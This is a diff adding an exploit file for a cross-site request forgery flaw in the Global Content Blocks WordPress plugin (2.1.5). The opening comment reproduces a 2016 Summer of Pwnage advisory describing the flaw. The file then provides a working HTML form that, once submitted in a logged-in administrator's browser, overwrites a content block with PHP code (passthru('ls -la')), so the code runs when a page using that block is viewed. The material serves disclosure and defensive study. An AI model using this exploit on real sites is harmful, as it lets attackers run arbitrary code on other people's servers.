@@ -1,0 +1,46 @@
+<!--
+Source: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_global_content_blocks_wordpress_plugin.html
+
+Abstract
+It was discovered that the Global Content Blocks WordPress Plugin is vulnerable to Cross-Site Request Forgery. Amongst others, this issue can be used to update a content block to overwrite it with arbitrary PHP code. Visiting a page or blog post that uses this content block will cause the attacker's PHP code to be executed.
+
+Contact
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160712-0031
+
+Tested versions
+This issue was successfully tested on Global Content Blocks WordPress Plugin version 2.1.5.
+
+Fix
+There is currently no fix available.
+
+Introduction
+The Global Content Blocks WordPress Plugin lets users create their own shortcodes to insert reusable code snippets, PHP or HTML including forms, opt-in boxes, iframes, Adsense code, etc, into pages and posts as well as widgets and directly into php content. Global Content Blocks is affected by Cross-Site Request Forgery. Amongst others, this issue can be used to update a content block to overwrite it with arbitrary PHP code. Visiting a page or blog post that uses this content block will cause the attacker's PHP code to be executed.
+
+Details
+The issue exists due to the fact that Global Content Blocks does not use the Cross-Site Request Forgery protection provided by WordPress. Actions with Global Content Blocks have a predictable format, thus an attacker can forge a request that can be executed by a logged in Administrator. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a malicious website.
+
+Proof of concept
+The following proof of concept will update/overwrite the content block with id 1. In order to run the attacker's PHP code, a page/blog needs to be viewed that contains this content block (eg, [contentblock id=1]).
+-->
+
+<html>
+   <body>
+      <form action="http://<target>/wp-admin/options-general.php?page=global-content-blocks" method="POST">
+         <input type="hidden" name="gcb_view" value="update" />
+         <input type="hidden" name="update_it" value="1" />
+         <input type="hidden" name="gcb_name" value="Foo" />
+         <input type="hidden" name="gcb_custom_id" value="" />
+         <input type="hidden" name="gcb_type" value="php" />
+         <input type="hidden" name="gcb_description" value="" />
+         <input type="hidden" name="gcbvalue" value="passthru('ls -la');" />
+         <input type="hidden" name="gcb_updateshortcode" value="Update" />
+         <input type="submit" value="Submit request" />
+      </form>
+   </body>
+</html>
